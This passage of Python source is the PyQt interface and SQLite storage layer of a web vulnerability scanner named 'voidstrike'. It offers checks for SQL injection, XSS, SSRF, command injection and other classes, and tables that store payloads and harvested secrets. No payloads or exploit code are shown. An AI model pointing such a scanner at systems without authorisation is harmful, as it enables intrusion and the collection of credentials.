        version.setStyleSheet(f"font-size: 12px; color: {Config.COLORS['text_secondary']}; margin-left: 10px;")
        layout.addWidget(version)
        layout.addStretch()
        self.status_label = QLabel('Ready')
        self.status_label.setStyleSheet(f"color: {Config.COLORS['text_secondary']}; font-weight: 600;")
        layout.addWidget(self.status_label)
        return header

    def create_dashboard_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)
        stats_layout = QHBoxLayout()
        self.stats_cards = {}
        stats_data = [('URLs Crawled', '0', '#0a0a0a'), ('Parameters', '0', '#27272a'), ('Vulnerabilities', '0', '#000000'), ('Secrets', '0', '#52525b'), ('APIs', '0', '#71717a')]
        for (title, value, color) in stats_data:
            card = self.create_stat_card(title, value, color)
            stats_layout.addWidget(card)
            self.stats_cards[title] = card
        layout.addLayout(stats_layout)
        charts_layout = QHBoxLayout()
        self.vuln_chart = self.create_pie_chart('Vulnerabilities by Severity')
        charts_layout.addWidget(self.vuln_chart)
        self.progress_chart = self.create_line_chart('Scan Progress')
        charts_layout.addWidget(self.progress_chart)
        layout.addLayout(charts_layout)
        log_group = QGroupBox('Live Log')
        log_layout = QVBoxLayout()
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setMaximumHeight(200)
        log_layout.addWidget(self.log_text)
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        return tab

    def create_stat_card(self, title: str, value: str, color: str) -> QFrame:
        card = QFrame()
        card.setFrameStyle(QFrame.Box)
        card.setStyleSheet(f"\n            QFrame {{\n                background-color: {Config.COLORS['background']};\n                border: 1px solid {Config.COLORS['border']};\n                border-radius: 10px;\n                padding: 14px 12px;\n                min-width: 152px;\n            }}\n        ")
        layout = QVBoxLayout(card)
        title_label = QLabel(title)
        title_label.setStyleSheet(f"color: {Config.COLORS['text_secondary']}; font-size: 12px;")
        layout.addWidget(title_label)
        value_label = QLabel(value)
        value_label.setStyleSheet(f'color: {color}; font-size: 24px; font-weight: bold;')
        layout.addWidget(value_label)
        card.value_label = value_label
        return card

    def create_pie_chart(self, title: str) -> QGroupBox:
        group = QGroupBox(title)
        layout = QVBoxLayout(group)
        self.pie_chart_view = QChartView()
        self.pie_chart_view.setRenderHint(QPainter.Antialiasing)
        self.pie_chart_view.setMinimumHeight(200)
        chart = QChart()
        chart.setTheme(QChart.ChartThemeLight)
        chart.setAnimationOptions(QChart.SeriesAnimations)
        chart.setBackgroundVisible(True)
        chart.setBackgroundBrush(QBrush(QColor(Config.COLORS['background'])))
        self.pie_series = QPieSeries()
        self.pie_series.append('Critical', 0)
        self.pie_series.append('High', 0)
        self.pie_series.append('Medium', 0)
        self.pie_series.append('Low', 0)
        colors = ['#000000', '#3f3f46', '#71717a', '#a1a1aa']
        for (i, slice_) in enumerate(self.pie_series.slices()):
            slice_.setColor(QColor(colors[i]))
            slice_.setLabelVisible(True)
        chart.addSeries(self.pie_series)
        chart.legend().setVisible(True)
        chart.legend().setAlignment(Qt.AlignRight)
        self.pie_chart_view.setChart(chart)
        layout.addWidget(self.pie_chart_view)
        return group

    def create_line_chart(self, title: str) -> QGroupBox:
        group = QGroupBox(title)
        layout = QVBoxLayout(group)
        self.line_chart_view = QChartView()
        self.line_chart_view.setRenderHint(QPainter.Antialiasing)
        self.line_chart_view.setMinimumHeight(200)
        chart = QChart()
        chart.setTheme(QChart.ChartThemeLight)
        chart.setAnimationOptions(QChart.SeriesAnimations)
        chart.setBackgroundVisible(True)
        chart.setBackgroundBrush(QBrush(QColor(Config.COLORS['background'])))
        self.line_series = QLineSeries()
        self.line_series.setName('Findings')
        self.line_series.setColor(QColor(Config.COLORS['primary']))
        chart.addSeries(self.line_series)
        axisX = QValueAxis()
        axisX.setTitleText('Time (seconds)')
        axisX.setLabelsColor(QColor(Config.COLORS['text_secondary']))
        axisY = QValueAxis()
        axisY.setTitleText('Count')
        axisY.setLabelsColor(QColor(Config.COLORS['text_secondary']))
        chart.addAxis(axisX, Qt.AlignBottom)
        chart.addAxis(axisY, Qt.AlignLeft)
        self.line_series.attachAxis(axisX)
        self.line_series.attachAxis(axisY)
        chart.legend().setVisible(True)
        chart.legend().setAlignment(Qt.AlignBottom)
        self.line_chart_view.setChart(chart)
        layout.addWidget(self.line_chart_view)
        return group

    def create_scan_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)
        target_group = QGroupBox('Target')
        target_layout = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText('https://target.example')
        target_layout.addWidget(self.target_input)
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        profile_group = QGroupBox('Scan Profile')
        profile_layout = QHBoxLayout()
        self.profile_combo = QComboBox()
        self.profile_combo.addItems(Config.SCAN_MODES.keys())
        profile_layout.addWidget(self.profile_combo)
        profile_group.setLayout(profile_layout)
        layout.addWidget(profile_group)
        options_group = QGroupBox('Scan Options')
        options_layout = QGridLayout()
        self.vuln_checks = {}
        row = 0
        col = 0
        for option in ['SQL Injection', 'XSS', 'LFI', 'SSRF', 'Command Injection', 'IDOR', 'Open Redirect', 'JWT', 'CSRF', 'File Upload']:
            checkbox = QCheckBox(option)
            self.vuln_checks[option.lower().replace(' ', '_')] = checkbox
            options_layout.addWidget(checkbox, row, col)
            col += 1
            if col > 2:
                col = 0
                row += 1
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        advanced_group = QGroupBox('Advanced Options')
        advanced_layout = QFormLayout()
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 1000)
        self.threads_spin.setValue(Config.DEFAULT_THREADS)
        advanced_layout.addRow('Threads:', self.threads_spin)
        self.depth_spin = QSpinBox()
        self.depth_spin.setRange(1, 10)
        self.depth_spin.setValue(Config.DEFAULT_DEPTH)
        advanced_layout.addRow('Crawl Depth:', self.depth_spin)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(Config.DEFAULT_TIMEOUT)
        advanced_layout.addRow('Timeout (seconds):', self.timeout_spin)
        self.use_remote_scan = QCheckBox('Use model-assisted analysis for this scan')
        self.use_remote_scan.setToolTip('Requires: Settings → allow model + valid API key (or env). Deepens notes, classification, and false-positive hints.')
        advanced_layout.addRow('', self.use_remote_scan)
        advanced_group.setLayout(advanced_layout)
        layout.addWidget(advanced_group)
        self.scan_btn = QPushButton('Run scan')
        self.scan_btn.setStyleSheet(f"\n            QPushButton {{\n                background-color: {Config.COLORS['primary']};\n                color: #ffffff;\n                padding: 14px 28px;\n                font-size: 15px;\n                font-weight: bold;\n                border-radius: 8px;\n                border: 2px solid {Config.COLORS['primary']};\n            }}\n            QPushButton:hover {{\n                background-color: #ffffff;\n                color: {Config.COLORS['primary']};\n            }}\n            QPushButton:disabled {{\n                background-color: {Config.COLORS['surface_dark']};\n                color: {Config.COLORS['text_hint']};\n                border-color: {Config.COLORS['border']};\n            }}\n        ")
        self.scan_btn.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_btn)
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        layout.addStretch()
        return tab

    def create_results_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)
        toolbar = QToolBar()
        self.filter_combo = QComboBox()
        self.filter_combo.addItems(['All', 'Critical', 'High', 'Medium', 'Low', 'Info'])
        self.filter_combo.currentTextChanged.connect(self.filter_results)
        toolbar.addWidget(QLabel('Filter:'))
        toolbar.addWidget(self.filter_combo)
        toolbar.addSeparator()
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText('Filter…')
        self.search_input.textChanged.connect(self.search_results)
        toolbar.addWidget(self.search_input)
        toolbar.addSeparator()
        export_btn = QPushButton('Export Report')
        export_btn.clicked.connect(self.export_report)
        toolbar.addWidget(export_btn)
        layout.addWidget(toolbar)
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(8)
        self.results_table.setHorizontalHeaderLabels(['Severity', 'Type', 'URL', 'Parameter', 'Confidence', 'CVE', 'Status', 'Actions'])
        self.results_table.horizontalHeader().setStretchLastSection(True)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        layout.addWidget(self.results_table)
        self.summary_label = QLabel('Total: 0 | Critical: 0 | High: 0 | Medium: 0 | Low: 0 | Info: 0')
        self.summary_label.setStyleSheet(f"\n            QLabel {{\n                background-color: {Config.COLORS['surface']};\n                padding: 10px;\n                border-radius: 5px;\n            }}\n        ")
        layout.addWidget(self.summary_label)
        return tab

    def create_reports_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)
        report_group = QGroupBox('Generate Report')
        report_layout = QFormLayout()
        self.report_format = QComboBox()
        self.report_format.addItems(Config.REPORT_FORMATS)
        report_layout.addRow('Format:', self.report_format)
        self.report_include = {}
        for item in ['Descriptions', 'Severity', 'Reproduction', 'Mitigation', 'Screenshots', 'Stack']:
            checkbox = QCheckBox(item)
            self.report_include[item] = checkbox
            checkbox.setChecked(True)
            report_layout.addRow('', checkbox)
        generate_btn = QPushButton('Generate Report')
        generate_btn.clicked.connect(self.generate_report)
        report_layout.addRow('', generate_btn)
        report_group.setLayout(report_layout)
        layout.addWidget(report_group)
        recent_group = QGroupBox('Recent Reports')
        recent_layout = QVBoxLayout()
        self.recent_list = QListWidget()
        recent_layout.addWidget(self.recent_list)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        return tab

    def create_settings_tab(self) -> QWidget:
        tab = QWidget()
        layout = QVBoxLayout(tab)
        hint = QLabel('Model: enable below and paste the API key; it is stored only in your local settings file created by this app (Settings → Save). Use “model-assisted” on the Scan tab when needed.')
        hint.setWordWrap(True)
        hint.setStyleSheet(f"color: {Config.COLORS['text_secondary']}; padding: 4px 0 12px 0;")
        layout.addWidget(hint)
        model_group = QGroupBox('Model-assisted scan (optional)')
        model_layout = QFormLayout()
        self.llm_allow = QCheckBox('Allow model-assisted analysis')
        self.llm_allow.setChecked(Config.AI_ANALYZER_ENABLED)
        model_layout.addRow('', self.llm_allow)
        self.llm_key = QLineEdit()
        self.llm_key.setEchoMode(QLineEdit.Password)
        self.llm_key.setPlaceholderText('Paste API key here, then Save Settings')
        model_layout.addRow('API key:', self.llm_key)
        model_group.setLayout(model_layout)
        layout.addWidget(model_group)
        scan_group = QGroupBox('Defaults')
        scan_layout = QFormLayout()
        self.default_threads = QSpinBox()
        self.default_threads.setRange(1, 1000)
        self.default_threads.setValue(Config.DEFAULT_THREADS)
        scan_layout.addRow('Default Threads:', self.default_threads)
        self.default_depth = QSpinBox()
        self.default_depth.setRange(1, 10)
        self.default_depth.setValue(Config.DEFAULT_DEPTH)
        scan_layout.addRow('Default Depth:', self.default_depth)
        self.default_timeout = QSpinBox()
        self.default_timeout.setRange(1, 60)
        self.default_timeout.setValue(Config.DEFAULT_TIMEOUT)
        scan_layout.addRow('Default Timeout:', self.default_timeout)
        scan_group.setLayout(scan_layout)
        layout.addWidget(scan_group)
        save_btn = QPushButton('Save Settings')
        save_btn.clicked.connect(self.save_settings)
        layout.addWidget(save_btn)
        layout.addStretch()
        return tab

    def set_scanner(self, scanner):
        self.scanner = scanner

    def start_scan(self):
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, 'Error', 'Please enter a target URL')
            return
        profile = self.profile_combo.currentText()
        self.scan_btn.setEnabled(False)
        self.scan_btn.setText('Scanning...')
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.status_label.setText('Scanning…')
        self.status_label.setStyleSheet(f"color: {Config.COLORS['text_primary']}; font-weight: bold;")
        self.results_table.setRowCount(0)
        self.log_text.clear()
        self.scan_thread = QThread()
        scan_opts = {'use_remote_analysis': self.use_remote_scan.isChecked()}
        self.scan_worker = ScanWorker(self.scanner, target, profile, scan_opts)
        self.scan_worker.moveToThread(self.scan_thread)
        self.scan_thread.started.connect(self.scan_worker.run)
        self.scan_worker.progress.connect(self.update_scan_progress)
        self.scan_worker.result.connect(self.add_vulnerability)
        self.scan_worker.finished.connect(self.scan_finished)
        self.scan_worker.finished.connect(self.scan_thread.quit)
        self.scan_worker.finished.connect(self.scan_worker.deleteLater)
        self.scan_thread.finished.connect(self.scan_thread.deleteLater)
        self.scan_thread.start()

    def update_scan_progress(self, value: int, message: str):
        self.progress_bar.setValue(value)
        self.log(message)
        if hasattr(self.scanner, 'stats'):
            stats = self.scanner.stats
            if 'URLs Crawled' in self.stats_cards:
                self.stats_cards['URLs Crawled'].value_label.setText(str(stats.get('urls_crawled', 0)))
            if 'Parameters' in self.stats_cards:
                self.stats_cards['Parameters'].value_label.setText(str(stats.get('parameters', 0)))
            if 'Vulnerabilities' in self.stats_cards:
                self.stats_cards['Vulnerabilities'].value_label.setText(str(stats.get('vulnerabilities', 0)))

    def add_vulnerability(self, vuln: Dict):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        severity_item = QTableWidgetItem(vuln.get('severity', 'Unknown'))
        severity_colors = {'Critical': '#000000', 'High': '#27272a', 'Medium': '#52525b', 'Low': '#71717a', 'Info': '#a1a1aa'}
        severity_item.setForeground(QColor(severity_colors.get(vuln.get('severity'), Config.COLORS['text_primary'])))
        severity_item.setFont(QFont(Config.GUI_FONT, 10, QFont.Bold))
        self.results_table.setItem(row, 0, severity_item)
        self.results_table.setItem(row, 1, QTableWidgetItem(vuln.get('type', '')))
        url_item = QTableWidgetItem(vuln.get('url', ''))
        url_item.setToolTip(vuln.get('url', ''))
        self.results_table.setItem(row, 2, url_item)
        self.results_table.setItem(row, 3, QTableWidgetItem(vuln.get('parameter', '')))
        confidence = vuln.get('confidence', 0)
        confidence_item = QTableWidgetItem(f'{confidence:.1%}' if isinstance(confidence, float) else str(confidence))
        confidence_item.setTextAlignment(Qt.AlignCenter)
        self.results_table.setItem(row, 4, confidence_item)
        self.results_table.setItem(row, 5, QTableWidgetItem(vuln.get('cve', '')))
        status_item = QTableWidgetItem('Verified' if vuln.get('verified') else 'Unverified')
        status_item.setForeground(QColor('#0a0a0a' if vuln.get('verified') else '#71717a'))
        self.results_table.setItem(row, 6, status_item)
        view_btn = QPushButton('View')
        view_btn.clicked.connect(lambda : self.view_vulnerability(vuln))
        self.results_table.setCellWidget(row, 7, view_btn)
        self.update_summary()

    def update_summary(self):
        total = self.results_table.rowCount()
        critical = high = medium = low = info = 0
        for row in range(total):
            severity = self.results_table.item(row, 0).text()
            if severity == 'Critical':
                critical += 1
            elif severity == 'High':
                high += 1
            elif severity == 'Medium':
                medium += 1
            elif severity == 'Low':
                low += 1
            elif severity == 'Info':
                info += 1
        self.summary_label.setText(f'Total: {total} | Critical: {critical} | High: {high} | Medium: {medium} | Low: {low} | Info: {info}')
        self.pie_series.clear()
        if critical > 0:
            slice_ = self.pie_series.append(f'Critical ({critical})', critical)
            slice_.setColor(QColor('#000000'))
        if high > 0:
            slice_ = self.pie_series.append(f'High ({high})', high)
            slice_.setColor(QColor('#27272a'))
        if medium > 0:
            slice_ = self.pie_series.append(f'Medium ({medium})', medium)
            slice_.setColor(QColor('#52525b'))
        if low > 0:
            slice_ = self.pie_series.append(f'Low ({low})', low)
            slice_.setColor(QColor('#71717a'))
        if info > 0:
            slice_ = self.pie_series.append(f'Info ({info})', info)
            slice_.setColor(QColor('#a1a1aa'))
        self.line_series.append(time.time(), total)

    def scan_finished(self):
        self.scan_btn.setEnabled(True)
        self.scan_btn.setText('Run scan')
        self.progress_bar.setVisible(False)
        self.status_label.setText('Ready')
        self.status_label.setStyleSheet(f"color: {Config.COLORS['text_secondary']}; font-weight: 600;")
        self.log('Scan completed!')
        QMessageBox.information(self, 'Done', f'Rows: {self.results_table.rowCount()}')

    def filter_results(self, filter_text: str):
        for row in range(self.results_table.rowCount()):
            severity = self.results_table.item(row, 0).text()
            if filter_text == 'All' or severity == filter_text:
                self.results_table.setRowHidden(row, False)
            else:
                self.results_table.setRowHidden(row, True)

    def search_results(self, text: str):
        if not text:
            for row in range(self.results_table.rowCount()):
                self.results_table.setRowHidden(row, False)
            return
        text = text.lower()
        for row in range(self.results_table.rowCount()):
            found = False
            for col in range(self.results_table.columnCount() - 1):
                item = self.results_table.item(row, col)
                if item and text in item.text().lower():
                    found = True
                    break
            self.results_table.setRowHidden(row, not found)

    def view_vulnerability(self, vuln: Dict):
        dialog = VulnerabilityDetailDialog(vuln, self)
        dialog.exec_()

    def export_report(self):
        if self.results_table.rowCount() == 0:
            QMessageBox.warning(self, 'Error', 'No results to export')
            return
        (filename, _) = QFileDialog.getSaveFileName(self, 'Save Report', f'voidstrike_report.{self.report_format.currentText()}', f'{self.report_format.currentText().upper()} Files (*.{self.report_format.currentText()})')
        if filename:
            vulnerabilities = []
            for row in range(self.results_table.rowCount()):
                vuln = {'severity': self.results_table.item(row, 0).text(), 'type': self.results_table.item(row, 1).text(), 'url': self.results_table.item(row, 2).text(), 'parameter': self.results_table.item(row, 3).text(), 'confidence': self.results_table.item(row, 4).text().replace('%', ''), 'cve': self.results_table.item(row, 5).text()}
                vulnerabilities.append(vuln)
            self.log(f'Generating report: {filename}')
            QMessageBox.information(self, 'Success', f'Report saved: {filename}')

    def generate_report(self):
        self.export_report()

    def save_settings(self):
        Config.AI_ANALYZER_ENABLED = self.llm_allow.isChecked()
        key = self.llm_key.text().strip()
        if key:
            Config.DEEPSEEK_API_KEY = key
        Config.DEFAULT_THREADS = self.default_threads.value()
        Config.DEFAULT_DEPTH = self.default_depth.value()
        Config.DEFAULT_TIMEOUT = self.default_timeout.value()
        Config.save()
        if self.scanner and getattr(self.scanner, 'remote_analyzer', None):
            self.scanner.remote_analyzer.refresh_connection()
        QMessageBox.information(self, 'Saved', 'Settings saved.')

    def update_dashboard(self):
        if self.scanner and hasattr(self.scanner, 'get_stats'):
            stats = self.scanner.get_stats()
            pass

    def log(self, message: str, level: str='info'):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_text.append(f'[{timestamp}] {message}')
        cursor = self.log_text.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.log_text.setTextCursor(cursor)

class VulnerabilityDetailDialog(QDialog):

    def __init__(self, vuln: Dict, parent=None):
        super().__init__(parent)
        self.vuln = vuln
        self.setWindowTitle(f"Vulnerability Details - {vuln.get('type', 'Unknown')}")
        self.setMinimumSize(600, 400)
        self.setModal(True)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        header = QLabel(f"<h2>{self.vuln.get('type', 'Unknown')}</h2>")
        header.setStyleSheet(f"color: {Config.COLORS['primary']};")
        layout.addWidget(header)
        severity = self.vuln.get('severity', 'Unknown')
        severity_colors = {'Critical': '#000000', 'High': '#27272a', 'Medium': '#52525b', 'Low': '#71717a', 'Info': '#a1a1aa'}
        severity_label = QLabel(f'Severity: {severity}')
        severity_label.setStyleSheet(f"color: {severity_colors.get(severity, Config.COLORS['text_primary'])}; font-weight: bold;")
        layout.addWidget(severity_label)
        details_group = QGroupBox('Details')
        details_layout = QFormLayout()
        details_layout.addRow('URL:', QLabel(self.vuln.get('url', 'N/A')))
        details_layout.addRow('Parameter:', QLabel(self.vuln.get('parameter', 'N/A')))
        details_layout.addRow('Payload:', QLabel(self.vuln.get('payload', 'N/A')))
        details_layout.addRow('Confidence:', QLabel(f"{self.vuln.get('confidence', 0)}%"))
        details_layout.addRow('CVE:', QLabel(self.vuln.get('cve', 'N/A')))
        details_layout.addRow('Verified:', QLabel('Yes' if self.vuln.get('verified') else 'No'))
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        if self.vuln.get('evidence'):
            evidence_group = QGroupBox('Evidence')
            evidence_layout = QVBoxLayout()
            evidence_text = QTextEdit()
            evidence_text.setReadOnly(True)
            evidence_text.setPlainText(self.vuln['evidence'])
            evidence_layout.addWidget(evidence_text)
            evidence_group.setLayout(evidence_layout)
            layout.addWidget(evidence_group)
        close_btn = QPushButton('Close')
        close_btn.clicked.connect(self.accept)
        layout.addWidget(close_btn)
        self.setLayout(layout)

class ScanWorker(QObject):
    progress = pyqtSignal(int, str)
    result = pyqtSignal(dict)
    finished = pyqtSignal()

    def __init__(self, scanner, target: str, profile: str, options: Dict):
        super().__init__()
        self.scanner = scanner
        self.target = target
        self.profile = profile
        self.options = options or {}

    @staticmethod
    def _normalize_finding(raw: Dict) -> Dict:
        conf = raw.get('confidence', 0)
        if isinstance(conf, float) and 0 <= conf <= 1:
            conf = int(conf * 100)
        elif not isinstance(conf, int):
            try:
                cf = float(conf)
                conf = int(cf * 100) if 0 <= cf <= 1 else int(cf)
            except (TypeError, ValueError):
                conf = 0
        conf = max(0, min(100, conf))
        return {'severity': raw.get('severity') or 'Info', 'type': raw.get('type') or raw.get('vuln_type') or 'Finding', 'url': raw.get('url', ''), 'parameter': raw.get('parameter') or raw.get('param', ''), 'payload': raw.get('payload', ''), 'confidence': conf, 'cve': raw.get('cve') or 'N/A', 'verified': bool(raw.get('verified', False)), 'evidence': (raw.get('evidence') or '')[:4000]}

    def run(self):
        loop = None
        log = logging.getLogger('voidstrike')
        try:
            if self.scanner is None:
                self.progress.emit(0, 'Scanner not initialized')
                return
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            async def _execute():
                app = self.scanner
                if not app.async_scanner:
                    await app.initialize()
                return await app.scan(self.target, self.profile, dict(self.options))
            self.progress.emit(5, 'Running scan pipeline…')
            results = loop.run_until_complete(_execute())
            vulns = results.get('vulnerabilities') or []
            n = max(len(vulns), 1)
            for (i, v) in enumerate(vulns):
                pct = 10 + int(80 * (i + 1) / n)
                self.progress.emit(min(pct, 95), f'Recording findings ({i + 1}/{len(vulns)})…')
                self.result.emit(ScanWorker._normalize_finding(v))
            if not vulns:
                self.progress.emit(90, 'No flagged findings (try a deeper profile or enable fuzzing).')
            urls_n = len(results.get('urls_crawled') or [])
            self.progress.emit(100, f'Done — {urls_n} URLs crawled, {len(vulns)} finding(s)')
            loop.run_until_complete(self.scanner.release_async_clients())
        except Exception as e:
            log.exception('Scan worker failed: %s', e)
            self.progress.emit(0, f'Error: {e}')
            if loop and self.scanner:
                try:
                    loop.run_until_complete(self.scanner.release_async_clients())
                except Exception:
                    pass
        finally:
            if loop is not None:
                try:
                    asyncio.set_event_loop(loop)
                    pending = asyncio.all_tasks(loop)
                    for t in pending:
                        t.cancel()
                    if pending:
                        loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                except Exception:
                    pass
                loop.close()
            self.finished.emit()

class DatabaseSystem:

    def __init__(self):
        self.conn = None
        self.cursor = None
        self.logger = logging.getLogger('database')
        self.initialized = False

    async def initialize(self):
        try:
            if Config.DATABASE_TYPE == 'sqlite':
                self.conn = sqlite3.connect(Config.DATABASE_FILE)
                self.cursor = self.conn.cursor()
                await self._create_tables()
                self.initialized = True
                self.logger.info(f'SQLite database initialized: {Config.DATABASE_FILE}')
            elif Config.DATABASE_TYPE == 'postgresql':
                import asyncpg
                self.conn = await asyncpg.connect(host=Config.POSTGRESQL_HOST, port=Config.POSTGRESQL_PORT, user=Config.POSTGRESQL_USER, password=Config.POSTGRESQL_PASSWORD, database=Config.POSTGRESQL_DATABASE)
                await self._create_postgres_tables()
                self.initialized = True
                self.logger.info('PostgreSQL database initialized')
        except Exception as e:
            self.logger.error(f'Database initialization error: {e}')

    async def _create_tables(self):
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS targets (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                url TEXT NOT NULL,\n                domain TEXT,\n                ip TEXT,\n                first_seen TIMESTAMP,\n                last_scanned TIMESTAMP,\n                scan_count INTEGER DEFAULT 0\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS scans (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                target_id INTEGER,\n                start_time TIMESTAMP,\n                end_time TIMESTAMP,\n                duration REAL,\n                profile TEXT,\n                status TEXT,\n                urls_crawled INTEGER,\n                parameters_tested INTEGER,\n                requests_made INTEGER,\n                FOREIGN KEY (target_id) REFERENCES targets (id)\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS vulnerabilities (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                scan_id INTEGER,\n                type TEXT,\n                name TEXT,\n                severity TEXT,\n                url TEXT,\n                parameter TEXT,\n                payload TEXT,\n                evidence TEXT,\n                description TEXT,\n                remediation TEXT,\n                cve TEXT,\n                cwe TEXT,\n                confidence REAL,\n                verified BOOLEAN,\n                timestamp TIMESTAMP,\n                FOREIGN KEY (scan_id) REFERENCES scans (id)\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS endpoints (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                scan_id INTEGER,\n                url TEXT,\n                status_code INTEGER,\n                content_type TEXT,\n                title TEXT,\n                depth INTEGER,\n                FOREIGN KEY (scan_id) REFERENCES scans (id)\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS parameters (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                scan_id INTEGER,\n                name TEXT,\n                url TEXT,\n                source TEXT,\n                FOREIGN KEY (scan_id) REFERENCES scans (id)\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS secrets (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                scan_id INTEGER,\n                type TEXT,\n                value TEXT,\n                source_url TEXT,\n                line_number INTEGER,\n                confidence REAL,\n                FOREIGN KEY (scan_id) REFERENCES scans (id)\n            )\n        ')
        self.cursor.execute('\n            CREATE TABLE IF NOT EXISTS subdomains (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                scan_id INTEGER,\n                subdomain TEXT,\n                ip TEXT,\n                status_code INTEGER,\n                title TEXT,\n                server TEXT,\n                FOREIGN KEY (scan_id) REFERENCES scans (id)\n            )\n        ')
        self.conn.commit()

    async def _create_postgres_tables(self):
        pass

    async def save_target(self, url: str, ip: str=None) -> int:
        domain = urlparse(url).netloc
        self.cursor.execute('\n            INSERT OR IGNORE INTO targets (url, domain, ip, first_seen)\n            VALUES (?, ?, ?, ?)\n        ', (url, domain, ip, datetime.now()))
        self.cursor.execute('SELECT id FROM targets WHERE url = ?', (url,))
        result = self.cursor.fetchone()
        if result:
            return result[0]
        self.conn.commit()
        return self.cursor.lastrowid

    async def save_scan(self, target_id: int, results: Dict) -> int:
        uc = results.get('urls_crawled', 0)
        if isinstance(uc, list):
            uc = len(uc)
        pt = results.get('parameters_tested', 0)
        if pt == 0 and isinstance(results.get('parameters'), list):
            pt = len(results['parameters'])
        self.cursor.execute('\n            INSERT INTO scans (\n                target_id, start_time, end_time, duration, profile,\n                status, urls_crawled, parameters_tested, requests_made\n            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)\n        ', (target_id, results.get('start_time'), results.get('end_time'), results.get('duration'), results.get('profile'), results.get('status', 'completed'), uc, pt, results.get('requests_made', 0)))
        self.conn.commit()
        return self.cursor.lastrowid

    async def save_vulnerabilities(self, scan_id: int, vulnerabilities: List[Dict]):
        for vuln in vulnerabilities:
            self.cursor.execute('\n                INSERT INTO vulnerabilities (\n                    scan_id, type, name, severity, url, parameter,\n                    payload, evidence, description, remediation,\n                    cve, cwe, confidence, verified, timestamp\n                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n            ', (scan_id, vuln.get('type'), vuln.get('name'), vuln.get('severity'), vuln.get('url'), vuln.get('parameter'), vuln.get('payload'), vuln.get('evidence'), vuln.get('description'), vuln.get('remediation'), vuln.get('cve'), vuln.get('cwe'), vuln.get('confidence', 0), vuln.get('verified', False), vuln.get('timestamp', datetime.now())))
        self.conn.commit()

    async def save_endpoints(self, scan_id: int, endpoints: List[Dict]):
        for endpoint in endpoints:
            self.cursor.execute('\n                INSERT INTO endpoints (\n                    scan_id, url, status_code, content_type, title, depth\n                ) VALUES (?, ?, ?, ?, ?, ?)\n            ', (scan_id, endpoint.get('url'), endpoint.get('status_code'), endpoint.get('content_type'), endpoint.get('title'), endpoint.get('depth', 0)))
        self.conn.commit()

    async def save_parameters(self, scan_id: int, parameters: List[Dict]):
        for param in parameters:
            self.cursor.execute('\n                INSERT INTO parameters (scan_id, name, url, source)\n                VALUES (?, ?, ?, ?)\n            ', (scan_id, param.get('name'), param.get('url'), param.get('source', 'unknown')))
        self.conn.commit()

    async def save_secrets(self, scan_id: int, secrets: List[Dict]):
        for secret in secrets:
            self.cursor.execute('\n                INSERT INTO secrets (scan_id, type, value, source_url, line_number, confidence)\n                VALUES (?, ?, ?, ?, ?, ?)\n            ', (scan_id, secret.get('type'), secret.get('value'), secret.get('source_url'), secret.get('line_number'), secret.get('confidence', 0)))
        self.conn.commit()

    async def save_subdomains(self, scan_id: int, subdomains: List[Dict]):
        for sub in subdomains:
            self.cursor.execute('\n                INSERT INTO subdomains (scan_id, subdomain, ip, status_code, title, server)\n                VALUES (?, ?, ?, ?, ?, ?)\n            ', (scan_id, sub.get('subdomain'), sub.get('ip'), sub.get('status_code'), sub.get('title'), sub.get('server')))
        self.conn.commit()

    async def get_scan_history(self, target_url: str=None, limit: int=10) -> List[Dict]:
        if target_url:
            self.cursor.execute('\n                SELECT s.* FROM scans s\n                JOIN targets t ON s.target_id = t.id\n                WHERE t.url = ?\n                ORDER BY s.start_time DESC\n                LIMIT ?\n            ', (target_url, limit))
        else:
            self.cursor.execute('\n                SELECT s.* FROM scans s\n                ORDER BY s.start_time DESC\n                LIMIT ?\n            ', (limit,))
        rows = self.cursor.fetchall()
        columns = [description[0] for description in self.cursor.description]
        results = []
        for row in rows:
            results.append(dict(zip(columns, row)))
        return results

